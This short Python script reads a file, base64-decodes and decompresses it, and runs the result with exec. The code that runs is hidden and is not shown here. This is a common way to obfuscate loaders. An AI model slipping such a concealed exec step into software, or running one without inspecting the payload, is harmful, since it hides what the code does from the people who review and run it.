from pathlib import Path
import base64
import zlib

payload = Path("tools/userspace_pipelines_payload.txt").read_text()
source = zlib.decompress(base64.b64decode(payload)).decode()
exec(compile(source, "userspace-pipeline-integration", "exec"))
